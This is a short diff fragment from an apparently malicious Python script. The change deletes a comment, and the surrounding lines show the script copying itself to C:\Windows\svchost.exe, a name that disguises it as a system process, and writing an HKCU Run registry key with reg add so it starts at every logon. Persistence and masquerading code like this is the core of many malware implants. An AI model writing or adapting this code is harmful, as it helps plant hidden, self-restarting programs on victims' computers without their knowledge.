@@ -9,7 +9,7 @@ def main():
     if checkfile == True:
         exist()
     else:
-    # Copy file to C:
+    
         copyfile(os.path.basename(sys.argv[0]), "C:\\Windows\svchost.exe")
         subprocess.call("reg add HKCU\Software\Microsoft\windows\CurrentVersion\Run /v svchost /t REG_SZ /d C:\\Windows\svchost.exe /f", shell=True)
     
